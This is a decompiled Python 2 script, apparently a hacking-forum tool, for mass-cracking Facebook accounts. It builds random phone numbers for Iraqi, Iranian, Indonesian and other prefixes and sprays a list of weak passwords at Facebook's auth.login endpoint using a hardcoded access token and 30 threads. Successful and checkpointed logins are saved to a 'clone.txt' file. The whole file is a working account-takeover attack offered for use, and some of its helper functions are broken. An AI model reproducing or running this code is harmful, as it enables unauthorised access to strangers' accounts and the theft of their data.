# Decompiled By Venom
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jan  8 2021, 21:22:55) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(6000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 All.py')

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
    print 'Thanks.'
    os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!' + w[random.randint(0, len(w) - 1)] + i

    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x = x.replace('!%s' % i, '\x1b[%s;1m' % str(31 + j))

    x += '\x1b[0m'
    x = x.replace('!0', '\x1b[0m')
    sys.stdout.write(x + '\n')


def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.1)


def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


back = 0
oks = []
id = []
cpb = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
os.system('clear')
logo = '--------------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author   : </>Fsociety/>     \n\x1b[1;97m\xe2\x9e\xa3 Discord invite  : discord.gg/robot \n\x1b[1;97m\xe2\x9e\xa3 ME   @Fsociety:\n\x1b[1;97m\xe2\x9e\xa3 Note  : This Tool Edit By (RobotVenom) (Robot1616)\n\x1b[1;97m--------------------------------------------------\n'
logo2 = ""
CorrectUsername = 'robotvenom'
CorrectPassword = 'robotvenom'
os.system('clear')
print logo2
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;97m\xe2\x9e\xa3 Username Tools : ')
    if username == CorrectUsername:
        password = raw_input('\x1b[1;97m\xe2\x9e\xa3 Password Tools : ')
        if password == CorrectPassword:
            print '\x1b[1;92m[\xe2\x9c\x93] Logged in successfully as' + username
            time.sleep(0.5)
            loop = 'false'
        else:
            print 'Wrong Password'
    else:
        print 'Wrong Username'

def lisensi():
    os.system('clear')
    menu()


def menu():
    os.system('clear')
    print logo
    print '\x1b[1;97m[1]\x1b[1;97m  IRAQ'
    print '\x1b[1;97m[2]\x1b[1;92m  Free Mod [\033[1;93mNO CP]'
    print '\n\x1b[1;97m[0]  Exit            '
    print '\x1b[1;97m--------------------------------------------------\n'
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;97mChoose an Option : \x1b[1;97m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97mCrack Number IRAQ' + '\n'
        print '\x1b[1;97m750 751 752 770 771 772 773 774 780 781 782 783' + '\n'
        try:
            c = raw_input('\x1b[1;97mChoose Area Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '2':
        os.system('clear')
        print logo
        print '\x1b[1;97mCrack Number IRAQ [\033[1;92mFree Mod]' + '\n'
        print '\x1b[1;97m 750 751 752 770 771 772 773 774 780' + '\n'
        try:
            c = raw_input('\x1b[1;97mChoose Area Code : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '3':
        os.system('clear')
        print logo
        print '\x1b[1;97mArea Codes With Network' + '\n'
        print '\x1b[1;97m01,49\n'
        try:
            c = raw_input('\x1b[1;97mChoose Area Code : ')
            k = '+923'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '4':
        os.system('clear')
        print logo
        print '\x1b[1;97mArea Codes With Network' + '\n'
        print '\x1b[1;97m311,511,411,21,352,242' + '\n'
        try:
            c = raw_input('\x1b[1;97mChoose Area Code : ')
            k = '+98'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '5':
        os.system('clear')
        print logo
        print '\x1b[1;97mArea Codes With Network' + '\n'
        print '\x1b[1;97m950,951,952,953,954,955,812,813,838,857,895,896' + '\n'
        try:
            c = raw_input('\x1b[1;97mChoose Area Code : ')
            k = '+628'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '0':
        menu()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Cloning Process Has Been Started')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Trying  Wait...')
    time.sleep(0.5)
    psb('[!] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print '\x1b[1;97m--------------------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('anggaxd')
        except OSError:
            pass

        try:
            pass1 = '8801714'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass1
                okb = open('anggaxd/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;97m[Check-point] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass1
                cps = open('anggaxd/clone.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456654321'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    okb = open('anggaxd/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;97m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    cps = open('anggaxd/clone.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '1234554321'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass3
                        okb = open('anggaxd/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[Checkpoint] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass3
                        cps = open('anggaxd/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '112233445566'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass4
                            okb = open('anggaxd/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[Check-point] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass4
                            cps = open('anggaxd/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '123456123456'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass5
                                okb = open('anggaxd/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;97m[Check-point] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass5
                                cps = open('anggaxd/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
                            else:
                                pass6 = '1234512345'
                                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass6
                                    okb = open('anggaxd/clone.txt', 'a')
                                    okb.write(k + c + user + pass6 + '\n')
                                    okb.close()
                                    oks.append(c + user + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;97m[Check-point] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass6
                                    cps = open('anggaxd/clone.txt', 'a')
                                    cps.write(k + c + user + pass6 + '\n')
                                    cps.close()
                                    cpb.append(c + user + pass6)
                                else:
                                    pass7 = '1122334455'
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass7
                                        okb = open('anggaxd/clone.txt', 'a')
                                        okb.write(k + c + user + pass7 + '\n')
                                        okb.close()
                                        oks.append(c + user + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;97m[Check-point] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass7
                                        cps = open('anggaxd/clone.txt', 'a')
                                        cps.write(k + c + user + pass7 + '\n')
                                        cps.close()
                                        cpb.append(c + user + pass7)
                                    else:
                                        pass8 = user
                                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                        q = json.load(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[GOOD]  ' + k + c + user + '  \x1b[1;97m|  ' + pass8
                                            okb = open('anggaxd/clone.txt', 'a')
                                            okb.write(k + c + user + pass8 + '\n')
                                            okb.close()
                                            oks.append(c + user + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;97m[Check-point] \x1b[1;97m' + k + c + user + '  \x1b[1;97m|  ' + pass8
                                            cps = open('anggaxd/clone.txt', 'a')
                                            cps.write(k + c + user + pass8 + '\n')
                                            cps.close()
                                            cpb.append(c + user + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m--------------------------------------------------'
    print '[\xe2\x9c\x93] Process Has Been Completed ...'
    print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;97m]')
    menu()


if __name__ == '__main__':
    menu()
